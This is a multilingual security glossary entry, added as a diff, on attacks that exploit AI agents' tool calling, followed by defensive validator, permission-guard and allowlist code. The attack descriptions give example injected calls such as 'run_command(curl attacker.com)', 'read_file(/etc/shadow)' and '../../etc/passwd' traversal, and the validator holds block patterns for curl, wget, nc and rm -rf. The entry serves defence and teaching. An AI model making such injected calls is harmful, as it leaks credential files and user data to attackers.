@@ -1,0 +1,343 @@
+id: tool-use-attack
+name: Tool Use Attack
+fullName: AI Agent Tool Use Exploitation
+category: ai-security
+desc:
+  tr: |-
+    AI agent'ların tool/function calling mekanizmalarını exploit etmeye yönelik saldırı sınıfı. Saldırganlar, agent'ın çağırdığı araçları manipüle ederek yetkisiz dosya erişimi, komut çalıştırma veya veri sızdırma gerçekleştirebilir. [MCP](https://modelcontextprotocol.io), [LangChain](https://langchain.com), [OpenAI](https://openai.com) function calling gibi sistemlerde kritik bir risk oluşturur.
+
+    Klasik confused deputy problemi burada yeniden karşımıza çıkar: agent yüksek yetkilerle çalışırken, saldırgan prompt injection veya dolaylı manipülasyon yoluyla bu yetkileri kendi amaçları için kullanabilir. Agent'a verilen her araç potansiyel bir saldırı yüzeyi oluşturur.
+
+    [OWASP LLM Top 10](https://owasp.org/www-project-top-10-for-large-language-model-applications/)'da LLM08 (Excessive Agency) olarak sınıflandırılan bu risk, özellikle dosya sistemi, shell, veritabanı ve HTTP erişimi olan agent'larda yıkıcı sonuçlar doğurabilir.
+  en: |-
+    A class of attacks that exploit the tool/function calling mechanisms of AI agents. Attackers can manipulate the tools an agent invokes to achieve unauthorized file access, command execution, or data exfiltration. This poses a critical risk in systems like [MCP](https://modelcontextprotocol.io), [LangChain](https://langchain.com), and [OpenAI](https://openai.com) function calling.
+
+    The classic confused deputy problem resurfaces here: while the agent operates with elevated privileges, an attacker can leverage those privileges for their own purposes through prompt injection or indirect manipulation. Every tool granted to an agent creates a potential attack surface.
+
+    Classified as LLM08 (Excessive Agency) in the [OWASP LLM Top 10](https://owasp.org/www-project-top-10-for-large-language-model-applications/), this risk can have devastating consequences especially in agents with filesystem, shell, database, and HTTP access.
+  fr: |-
+    Une classe d'attaques exploitant les mecanismes d'appel d'outils/fonctions des agents IA. Les attaquants peuvent manipuler les outils invoqués par un agent pour obtenir un acces non autorise aux fichiers, executer des commandes ou exfiltrer des donnees. Cela pose un risque critique dans des systemes comme MCP, LangChain et le function calling d'OpenAI.
+
+    Le probleme classique du deputy confus reapparait ici : alors que l'agent opere avec des privileges eleves, un attaquant peut exploiter ces privileges a ses propres fins via l'injection de prompt ou la manipulation indirecte. Chaque outil accorde a un agent cree une surface d'attaque potentielle.
+
+    Classe comme LLM08 (Excessive Agency) dans le OWASP LLM Top 10, ce risque peut avoir des consequences devastatrices, en particulier pour les agents ayant acces au systeme de fichiers, au shell, aux bases de donnees et au HTTP.
+  zh: |-
+    一类利用AI代理工具/函数调用机制的攻击。攻击者可以操纵代理调用的工具来实现未授权的文件访问、命令执行或数据泄露。这在MCP、LangChain和OpenAI函数调用等系统中构成严重风险。
+
+    经典的困惑代理问题在此重新出现：当代理以高权限运行时，攻击者可以通过提示注入或间接操纵利用这些权限为自己服务。授予代理的每个工具都会创建一个潜在的攻击面。
+
+    在OWASP LLM Top 10中被归类为LLM08（过度授权），这一风险在拥有文件系统、shell、数据库和HTTP访问权限的代理中可能造成毁灭性后果。
+  ar: |-
+    فئة من الهجمات التي تستغل آليات استدعاء الأدوات/الوظائف في وكلاء الذكاء الاصطناعي. يمكن للمهاجمين التلاعب بالأدوات التي يستدعيها الوكيل لتحقيق وصول غير مصرح به للملفات أو تنفيذ أوامر أو تسريب بيانات. يشكل هذا خطراً حرجاً في أنظمة مثل MCP وLangChain واستدعاء وظائف OpenAI.
+
+    تظهر مشكلة النائب المرتبك الكلاسيكية هنا مجدداً: بينما يعمل الوكيل بصلاحيات مرتفعة، يمكن للمهاجم استغلال تلك الصلاحيات لأغراضه الخاصة عبر حقن الأوامر أو التلاعب غير المباشر. كل أداة تُمنح للوكيل تُنشئ سطح هجوم محتمل.
+
+    مصنف كـ LLM08 (الوكالة المفرطة) في قائمة OWASP LLM العشر الأوائل، يمكن أن يكون لهذا الخطر عواقب مدمرة خاصة في الوكلاء التي تملك وصولاً لنظام الملفات والصدفة وقواعد البيانات وHTTP.
+  ru: |-
+    Класс атак, эксплуатирующих механизмы вызова инструментов/функций ИИ-агентов. Злоумышленники могут манипулировать инструментами, которые вызывает агент, для получения несанкционированного доступа к файлам, выполнения команд или эксфильтрации данных. Это создаёт критический риск в системах вроде MCP, LangChain и function calling OpenAI.
+
+    Классическая проблема confused deputy проявляется здесь заново: пока агент работает с повышенными привилегиями, злоумышленник может использовать эти привилегии в своих целях через инъекцию промптов или косвенную манипуляцию. Каждый инструмент, предоставленный агенту, создаёт потенциальную поверхность атаки.
+
+    Классифицированный как LLM08 (Excessive Agency) в OWASP LLM Top 10, этот риск может иметь разрушительные последствия, особенно для агентов с доступом к файловой системе, shell, базам данных и HTTP.
+analogy:
+  tr: Bir şirketin güvenilir asistanına sahte bir not göndererek 'Müdür adına kasadan para çek' demek gibi. Asistan yetkili, ama talimatı veren kişi değil. Araçlar asistanın elleri — yanlış yönlendirilirse büyük zarar verebilir.
+  en: Like sending a fake note to a company's trusted assistant saying 'Withdraw cash from the safe on behalf of the manager'. The assistant has the authority, but the person giving the instruction does not. The tools are the assistant's hands — misdirected, they can cause great harm.
+  fr: Comme envoyer une fausse note a l'assistant de confiance d'une entreprise disant 'Retirez de l'argent du coffre au nom du directeur'. L'assistant a l'autorite, mais pas la personne qui donne l'instruction. Les outils sont les mains de l'assistant — mal diriges, ils peuvent causer de grands degats.
+  zh: 就像给公司的可信助理发送一张假条写着'代表经理从保险箱取钱'。助理有权限，但发出指令的人没有。工具就是助理的双手——被错误引导时，可以造成巨大损害。
+  ar: مثل إرسال مذكرة مزيفة لمساعد موثوق في شركة تقول 'اسحب أموالاً من الخزنة نيابة عن المدير'. المساعد لديه الصلاحية، لكن الشخص الذي أعطى التعليمات ليس لديه. الأدوات هي يدا المساعد — إذا وُجِّهت خطأً يمكنها إحداث ضرر كبير.
+  ru: "Как отправить поддельную записку доверенному помощнику компании: 'Снимите деньги из сейфа от имени директора'. Помощник имеет полномочия, но отдающий приказ — нет. Инструменты — это руки помощника: направленные не туда, они могут нанести огромный ущерб."
+security:
+  - title:
+      tr: Confused Deputy Attack
+      en: Confused Deputy Attack
+      fr: Attaque du deputy confus
+      zh: 困惑代理攻击
+      ar: هجوم النائب المرتبك
+      ru: Атака «запутанный заместитель»
+    description:
+      tr: Saldırgan, agent'ı yetkili araçlarını kötüye kullanmaya yönlendirir. Örneğin prompt injection ile agent'a 'read_file(/etc/shadow)' veya 'run_command(curl attacker.com)' çağrısı yaptırılabilir. Agent kendi yetkisiyle bu işlemi gerçekleştirir çünkü talimatın kaynağını doğrulayamaz.
+      en: The attacker directs the agent to misuse its authorized tools. For example, via prompt injection the agent can be made to call 'read_file(/etc/shadow)' or 'run_command(curl attacker.com)'. The agent executes with its own authority because it cannot verify the source of the instruction.
+      fr: L'attaquant dirige l'agent pour qu'il abuse de ses outils autorises. Par exemple, via l'injection de prompt, l'agent peut etre amene a appeler 'read_file(/etc/shadow)' ou 'run_command(curl attacker.com)'. L'agent execute avec sa propre autorite car il ne peut pas verifier la source de l'instruction.
+      zh: 攻击者引导代理滥用其授权工具。例如，通过提示注入可以让代理调用'read_file(/etc/shadow)'或'run_command(curl attacker.com)'。代理以自身权限执行操作，因为它无法验证指令来源。
+      ar: يوجه المهاجم الوكيل لإساءة استخدام أدواته المصرح بها. مثلاً عبر حقن الأوامر يمكن جعل الوكيل يستدعي 'read_file(/etc/shadow)' أو 'run_command(curl attacker.com)'. ينفذ الوكيل بصلاحياته الخاصة لأنه لا يستطيع التحقق من مصدر التعليمات.
+      ru: Злоумышленник направляет агента на злоупотребление авторизованными инструментами. Например, через инъекцию промпта агенту можно заставить вызвать 'read_file(/etc/shadow)' или 'run_command(curl attacker.com)'. Агент выполняет действие своими полномочиями, так как не может проверить источник инструкции.
+    severity: critical
+  - title:
+      tr: Tool Parameter Injection
+      en: Tool Parameter Injection
+      fr: Injection de parametres d'outils
+      zh: 工具参数注入
+      ar: حقن معاملات الأدوات
+      ru: Инъекция параметров инструментов
+    description:
+      tr: Araç parametrelerine zararlı değerler enjekte edilerek beklenmeyen işlemler gerçekleştirilir. Örneğin bir 'search' aracının query parametresine shell komutları veya path traversal (../../etc/passwd) gömülebilir. Parametre doğrulama eksikliğinde agent aracılığıyla sistem kompromize edilir.
+      en: Malicious values are injected into tool parameters to perform unexpected operations. For example, shell commands or path traversal (../../etc/passwd) can be embedded in a 'search' tool's query parameter. Without parameter validation, the system is compromised through the agent.
+      fr: Des valeurs malveillantes sont injectees dans les parametres d'outils pour effectuer des operations inattendues. Par exemple, des commandes shell ou du path traversal (../../etc/passwd) peuvent etre integres dans le parametre de requete d'un outil 'search'. Sans validation des parametres, le systeme est compromis via l'agent.
+      zh: 向工具参数注入恶意值以执行意外操作。例如，可以在'search'工具的查询参数中嵌入shell命令或路径遍历（../../etc/passwd）。缺乏参数验证时，系统会通过代理被攻破。
+      ar: يتم حقن قيم ضارة في معاملات الأدوات لتنفيذ عمليات غير متوقعة. مثلاً يمكن تضمين أوامر shell أو اجتياز المسار (../../etc/passwd) في معامل استعلام أداة 'search'. بدون التحقق من المعاملات يتم اختراق النظام عبر الوكيل.
+      ru: В параметры инструментов внедряются вредоносные значения для выполнения непредусмотренных операций. Например, в параметр запроса инструмента 'search' можно встроить shell-команды или path traversal (../../etc/passwd). При отсутствии валидации параметров система компрометируется через агента.
+    severity: critical
+  - title:
+      tr: Excessive Agency (OWASP LLM08)
+      en: Excessive Agency (OWASP LLM08)
+      fr: Agence excessive (OWASP LLM08)
+      zh: 过度授权（OWASP LLM08）
+      ar: الوكالة المفرطة (OWASP LLM08)
+      ru: Избыточные полномочия (OWASP LLM08)
+    description:
+      tr: Agent'a gereğinden fazla araç veya yetki verilmesi. Sadece dosya okuma gereken bir agent'a yazma ve silme yetkisi de verilmesi, saldırı yüzeyini gereksiz yere genişletir. En az yetki (least privilege) prensibi ihlali.
+      en: Granting an agent more tools or permissions than necessary. Giving write and delete permissions to an agent that only needs to read files unnecessarily expands the attack surface. A violation of the least privilege principle.
+      fr: Accorder a un agent plus d'outils ou de permissions que necessaire. Donner des permissions d'ecriture et de suppression a un agent qui n'a besoin que de lire des fichiers elargit inutilement la surface d'attaque. Une violation du principe du moindre privilege.
+      zh: 授予代理超出必要的工具或权限。给只需要读取文件的代理授予写入和删除权限，不必要地扩大了攻击面。这违反了最小权限原则。
+      ar: منح الوكيل أدوات أو صلاحيات أكثر من اللازم. إعطاء صلاحيات الكتابة والحذف لوكيل يحتاج فقط لقراءة الملفات يوسع سطح الهجوم دون داعٍ. انتهاك لمبدأ الحد الأدنى من الصلاحيات.
+      ru: Предоставление агенту больше инструментов или полномочий, чем необходимо. Выдача прав на запись и удаление агенту, которому нужно только читать файлы, неоправданно расширяет поверхность атаки. Нарушение принципа наименьших привилегий.
+    severity: high
+  - title:
+      tr: Tool Call Audit Gap
+      en: Tool Call Audit Gap
+      fr: Lacune d'audit des appels d'outils
+      zh: 工具调用审计缺口
+      ar: فجوة تدقيق استدعاءات الأدوات
+      ru: Пробел в аудите вызовов инструментов
+    description:
+      tr: Agent'ın araç çağrılarının yeterince loglanmaması ve izlenmemesi. Hangi araç, hangi parametrelerle, kimin talebiyle çağrıldığının kaydedilmemesi, saldırı tespitini ve forensic analizi imkansız kılar.
+      en: Insufficient logging and monitoring of agent tool calls. Not recording which tool was called, with what parameters, and at whose request makes attack detection and forensic analysis impossible.
+      fr: Journalisation et surveillance insuffisantes des appels d'outils de l'agent. Ne pas enregistrer quel outil a ete appele, avec quels parametres et a la demande de qui rend la detection d'attaques et l'analyse forensique impossibles.
+      zh: 对代理工具调用的日志记录和监控不足。不记录调用了哪个工具、使用了什么参数、应谁的请求发起，使得攻击检测和取证分析变得不可能。
+      ar: تسجيل ومراقبة غير كافية لاستدعاءات أدوات الوكيل. عدم تسجيل أي أداة تم استدعاؤها وبأي معاملات وبطلب من مَن يجعل اكتشاف الهجمات والتحليل الجنائي مستحيلاً.
+      ru: Недостаточное логирование и мониторинг вызовов инструментов агента. Отсутствие записи о том, какой инструмент вызван, с какими параметрами и по чьему запросу, делает невозможным обнаружение атак и форензик-анализ.
+    severity: low
+config:
+  - title: Tool Call Validator
+    lang: python
+    code: |-
+      from typing import Any, Callable
+      import re
+
+      class ToolCallValidator:
+          def __init__(self):
+              self.rules: dict[str, dict] = {}
+
+          def register(self, tool_name: str, *,
+                       allowed_params: list[str] = None,
+                       param_validators: dict[str, Callable] = None,
+                       blocked_patterns: list[str] = None):
+              self.rules[tool_name] = {
+                  "allowed_params": allowed_params,
+                  "validators": param_validators or {},
+                  "blocked": [re.compile(p) for p in (blocked_patterns or [])]
+              }
+
+          def validate(self, tool_name: str, params: dict[str, Any]) -> dict:
+              if tool_name not in self.rules:
+                  return {"allowed": False, "reason": f"Unknown tool: {tool_name}"}
+
+              rule = self.rules[tool_name]
+
+              # Check allowed params
+              if rule["allowed_params"]:
+                  extra = set(params.keys()) - set(rule["allowed_params"])
+                  if extra:
+                      return {"allowed": False, "reason": f"Disallowed params: {extra}"}
+
+              # Check blocked patterns in all param values
+              for key, val in params.items():
+                  val_str = str(val)
+                  for pattern in rule["blocked"]:
+                      if pattern.search(val_str):
+                          return {"allowed": False,
+                                  "reason": f"Blocked pattern in {key}: {pattern.pattern}"}
+
+                  # Run custom validator
+                  if key in rule["validators"]:
+                      if not rule["validators"][key](val):
+                          return {"allowed": False, "reason": f"Validation failed: {key}"}
+
+              return {"allowed": True}
+
+      # Usage
+      v = ToolCallValidator()
+      v.register("read_file",
+          allowed_params=["path"],
+          param_validators={"path": lambda p: not p.startswith("/etc")},
+          blocked_patterns=[r"\.\./", r"/proc/", r"/sys/"])
+
+      v.register("run_command",
+          allowed_params=["command"],
+          blocked_patterns=[r"curl\s", r"wget\s", r"nc\s", r"rm\s+-rf"])
+
+      result = v.validate("read_file", {"path": "../../etc/passwd"})
+      # -> {"allowed": False, "reason": "Blocked pattern in path: \\.\\./"}
+    description:
+      tr: Agent araç çağrılarını parametre seviyesinde doğrulayan validator. Blocked pattern'lar ve custom validator fonksiyonları ile zararlı parametreleri engeller.
+      en: Validator that verifies agent tool calls at parameter level. Blocks malicious parameters with blocked patterns and custom validator functions.
+      fr: Validateur qui verifie les appels d'outils de l'agent au niveau des parametres. Bloque les parametres malveillants avec des motifs bloques et des fonctions de validation personnalisees.
+      zh: 在参数级别验证代理工具调用的验证器。通过阻止模式和自定义验证函数阻止恶意参数。
+      ar: مدقق يتحقق من استدعاءات أدوات الوكيل على مستوى المعاملات. يحظر المعاملات الخبيثة بأنماط محظورة ودوال تحقق مخصصة.
+      ru: Валидатор, проверяющий вызовы инструментов агента на уровне параметров. Блокирует вредоносные параметры с помощью запрещённых паттернов и пользовательских функций валидации.
+  - title: MCP Permission Guard
+    lang: typescript
+    code: |-
+      interface ToolCall {
+        name: string;
+        arguments: Record<string, unknown>;
+      }
+
+      interface PermissionPolicy {
+        allowedTools: string[];
+        maxCallsPerMinute: number;
+        requireConfirmation: string[];
+        blockedArgPatterns: Record<string, RegExp[]>;
+      }
+
+      class MCPPermissionGuard {
+        private policy: PermissionPolicy;
+        private callLog: { tool: string; ts: number }[] = [];
+
+        constructor(policy: PermissionPolicy) {
+          this.policy = policy;
+        }
+
+        async check(call: ToolCall): Promise<{ allowed: boolean; reason?: string }> {
+          // 1. Tool allowlist
+          if (!this.policy.allowedTools.includes(call.name)) {
+            return { allowed: false, reason: `Tool not in allowlist: ${call.name}` };
+          }
+
+          // 2. Rate limiting
+          const now = Date.now();
+          this.callLog = this.callLog.filter(c => now - c.ts < 60_000);
+          if (this.callLog.length >= this.policy.maxCallsPerMinute) {
+            return { allowed: false, reason: "Rate limit exceeded" };
+          }
+
+          // 3. Argument pattern check
+          const patterns = this.policy.blockedArgPatterns[call.name] || [];
+          for (const [key, val] of Object.entries(call.arguments)) {
+            for (const pat of patterns) {
+              if (pat.test(String(val))) {
+                return { allowed: false, reason: `Blocked pattern in ${key}` };
+              }
+            }
+          }
+
+          // 4. Human-in-the-loop for sensitive tools
+          if (this.policy.requireConfirmation.includes(call.name)) {
+            const ok = await this.requestHumanApproval(call);
+            if (!ok) return { allowed: false, reason: "Human denied" };
+          }
+
+          this.callLog.push({ tool: call.name, ts: now });
+          return { allowed: true };
+        }
+
+        private async requestHumanApproval(call: ToolCall): Promise<boolean> {
+          console.log(`[APPROVAL] ${call.name}(${JSON.stringify(call.arguments)})`);
+          return false; // Default deny; integrate with UI
+        }
+      }
+
+      // Usage
+      const guard = new MCPPermissionGuard({
+        allowedTools: ["read_file", "search", "data_lookup"],
+        maxCallsPerMinute: 30,
+        requireConfirmation: ["run_command", "write_file"],
+        blockedArgPatterns: {
+          read_file: [/\.\.\//, /\/etc\//,  /\/proc\//],
+          search: [/;/, /\|/, /\$\(/]
+        }
+      });
+    description:
+      tr: MCP tool çağrıları için izin koruyucusu. Allowlist, rate limiting, argument pattern kontrolü ve hassas araçlar için human-in-the-loop onayı sağlar.
+      en: Permission guard for MCP tool calls. Provides allowlist, rate limiting, argument pattern checking, and human-in-the-loop approval for sensitive tools.
+      fr: Gardien de permissions pour les appels d'outils MCP. Fournit une liste d'autorisation, une limitation de debit, une verification des motifs d'arguments et une approbation humaine pour les outils sensibles.
+      zh: MCP工具调用的权限守卫。提供允许列表、速率限制、参数模式检查和敏感工具的人工审批。
+      ar: حارس أذونات لاستدعاءات أدوات MCP. يوفر قائمة مسموحة وتحديد معدل وفحص أنماط المعاملات وموافقة بشرية للأدوات الحساسة.
+      ru: Контроль доступа для вызовов инструментов MCP. Обеспечивает allowlist, rate limiting, проверку паттернов аргументов и human-in-the-loop для чувствительных инструментов.
+  - title: Tool Allowlist Config
+    lang: yaml
+    code: |-
+      # agent-tool-policy.yaml
+      agent_security:
+        default_policy: deny
+
+        tool_allowlist:
+          - name: read_file
+            allowed_paths:
+              - /app/data/**
+              - /tmp/workspace/**
+            blocked_paths:
+              - /etc/**
+              - /proc/**
+              - /sys/**
+            max_file_size: 1048576  # 1MB
+
+          - name: search
+            allowed_params: [query, limit]
+            max_results: 100
+
+          - name: http_request
+            allowed_domains:
+              - api.example.com
+              - docs.example.com
+            blocked_methods: [DELETE, PUT]
+            timeout_ms: 5000
+
+        rate_limits:
+          global: 60/min
+          per_tool:
+            run_command: 5/min
+            http_request: 20/min
+
+        audit:
+          log_all_calls: true
+          alert_on_blocked: true
+          retention_days: 90
+    description:
+      tr: Agent araç kullanımı için YAML tabanlı güvenlik politikası. Araç bazında path kısıtlaması, domain allowlist, rate limiting ve audit ayarları.
+      en: YAML-based security policy for agent tool usage. Per-tool path restrictions, domain allowlist, rate limiting, and audit settings.
+      fr: Politique de securite basee sur YAML pour l'utilisation d'outils par l'agent. Restrictions de chemin par outil, liste d'autorisation de domaines, limitation de debit et parametres d'audit.
+      zh: 基于YAML的代理工具使用安全策略。每个工具的路径限制、域名允许列表、速率限制和审计设置。
+      ar: سياسة أمان مبنية على YAML لاستخدام أدوات الوكيل. قيود مسار لكل أداة وقائمة نطاقات مسموحة وتحديد معدل وإعدادات تدقيق.
+      ru: Политика безопасности на основе YAML для использования инструментов агентом. Ограничения путей по инструментам, allowlist доменов, rate limiting и настройки аудита.
+research:
+  - title: "Not what you've signed up for: Compromising Real-World LLM-Integrated Applications with Indirect Prompt Injection"
+    url: https://arxiv.org/abs/2302.12173
+    year: 2023
+    type: paper
+    authors: Kai Greshake, Sahar Abdelnabi, Shailesh Mishra, et al.
+  - title: "OWASP Top 10 for LLM - LLM08: Excessive Agency"
+    url: https://owasp.org/www-project-top-10-for-large-language-model-applications/
+    year: 2024
+    type: documentation
+    authors: OWASP Foundation
+  - title: "Anthropic: Securing AI Agents — Tool Use Risks and Mitigations"
+    url: https://docs.anthropic.com/en/docs/build-with-claude/tool-use
+    year: 2024
+    type: documentation
+    authors: Anthropic
+tips:
+  - tr: Agent araçlarına mutlaka allowlist uygulayın — default-deny politikası ile sadece gerekli araçları açın.
+    en: Always apply an allowlist to agent tools — use a default-deny policy and only enable required tools.
+    fr: Appliquez toujours une liste d'autorisation aux outils de l'agent — utilisez une politique de refus par defaut et n'activez que les outils necessaires.
+    zh: 始终对代理工具应用允许列表——使用默认拒绝策略，仅启用所需工具。
+    ar: طبق دائماً قائمة مسموحة على أدوات الوكيل — استخدم سياسة الرفض الافتراضي وفعّل فقط الأدوات المطلوبة.
+    ru: Всегда применяйте allowlist к инструментам агента — используйте политику default-deny и включайте только необходимые инструменты.
+  - tr: Hassas araçlar (run_command, write_file) için human-in-the-loop onay mekanizması kurun.
+    en: Set up human-in-the-loop approval for sensitive tools (run_command, write_file).
+    fr: Mettez en place une approbation humaine pour les outils sensibles (run_command, write_file).
+    zh: 为敏感工具（run_command、write_file）设置人工审批机制。
+    ar: أنشئ آلية موافقة بشرية للأدوات الحساسة (run_command، write_file).
+    ru: Настройте human-in-the-loop одобрение для чувствительных инструментов (run_command, write_file).
+  - tr: Tüm araç çağrılarını parametre dahil loglayın — SIEM entegrasyonu ile anomali tespiti yapın.
+    en: Log all tool calls including parameters — integrate with SIEM for anomaly detection.
+    fr: Journalisez tous les appels d'outils avec les parametres — integrez avec SIEM pour la detection d'anomalies.
+    zh: 记录所有工具调用（包括参数）——与SIEM集成进行异常检测。
+    ar: سجل جميع استدعاءات الأدوات بما في ذلك المعاملات — ادمج مع SIEM لاكتشاف الشذوذ.
+    ru: Логируйте все вызовы инструментов включая параметры — интегрируйте с SIEM для обнаружения аномалий.
+  - tr: Araç parametrelerini schema validation ile doğrulayın — path traversal, shell injection gibi pattern'ları engelleyin.
+    en: Validate tool parameters with schema validation — block patterns like path traversal and shell injection.
+    fr: Validez les parametres d'outils avec une validation de schema — bloquez les motifs comme le path traversal et l'injection shell.
+    zh: 使用模式验证验证工具参数——阻止路径遍历和shell注入等模式。
+    ar: تحقق من معاملات الأدوات بالتحقق من المخطط — احظر أنماط مثل اجتياز المسار وحقن الصدفة.
+    ru: Валидируйте параметры инструментов с помощью schema validation — блокируйте паттерны вроде path traversal и shell injection.
